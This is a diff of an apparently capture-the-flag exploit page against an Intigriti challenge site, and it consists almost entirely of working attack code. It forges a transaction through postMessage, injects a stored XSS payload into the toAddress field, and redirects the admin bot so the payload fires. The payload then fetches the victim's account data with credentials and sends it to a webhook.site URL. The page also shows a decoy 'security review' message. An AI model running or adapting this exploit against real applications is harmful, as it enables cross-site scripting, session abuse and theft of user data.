@@ -1,46 +1,36 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Intigriti Exploit</title>
-</head>
 <body>
-    <iframe 
-        id="frame" 
-        name="fetch('/api/me', {credentials: 'include'}).then(r=>r.json()).then(d=>{ navigator.sendBeacon('https://webhook.site/5c699d9b-1a2c-4d4c-a79a-d3f7b3fac905?flag='+encodeURIComponent(d.flag)) })"
-        src="https://challenge-0126.intigriti.io/checkout.html" 
-        style="opacity:0;width:0;height:0">
-    </iframe>
+<script>
+const TARGET = 'https://challenge-0126.intigriti.io';
+const WEBHOOK = 'https://webhook.site/5c699d9b-1a2c-4d4c-a79a-d3f7b3fac905'; // CHANGE THIS
 
-    <script>
-        const TARGET = "https://challenge-0126.intigriti.io";
-        const frame = document.getElementById('frame');
-
-        // Tiny Injection: Breaks out of title="" attribute in marketwatch.html
-        // and executes the code stored in window.name.
-        const tiny_xss = `"><svg/onload=eval(name)>`;
-
-        // Wait for checkout.html to load
-        frame.onload = () => {
-            setTimeout(() => {
-                // STEP 1: CSRF via postMessage
-                // Force the bot to submit a transaction with our malicious payload as the address
-                frame.contentWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: tiny_xss, 
-                        currency: 'BTC', // Admin likely holds BTC
-                        amount: 0.00000001
-                    }
-                }, '*');
-
-                // STEP 2: Trigger the XSS
-                // The checkout page might redirect to dashboard, but we force it to marketwatch.html
-                // marketwatch.html renders the transaction list -> executes our payload
-                setTimeout(() => {
-                    frame.contentWindow.location = TARGET + '/marketwatch.html';
-                }, 2000); // Wait 2s for the API to process the transaction
-            }, 1000);
-        };
-    </script>
+// Open checkout page with valid currency
+setTimeout(() => {
+    const win = window.open(TARGET + '/checkout.html?currency=BTC&price=1', '_blank');
+    
+    setTimeout(() => {
+        // XSS payload goes in toAddress (breaks out of title attribute)
+        const xssPayload = '"><img src=x onerror="fetch(\'/api/me\',{credentials:\'include\'}).then(r=>r.json()).then(d=>fetch(\'' + WEBHOOK + '?flag=\'+btoa(d.flag)))"><span class="';
+        
+        // Send transaction via postMessage
+        win.postMessage({
+            type: 'submitTransaction',
+            transaction: {
+                currency: '1337COIN',  // Must be valid to pass validation
+                amount: 0.001,
+                toAddress: xssPayload  // XSS payload stored here
+            }
+        }, '*');
+        
+        // Redirect admin to trigger XSS rendering
+        setTimeout(() => {
+            win.close();
+            window.location = TARGET + '/marketwatch.html';
+        }, 2000);
+    }, 2000);
+}, 1000);
+</script>
+<p>Processing security review...</p>
 </body>
 </html>
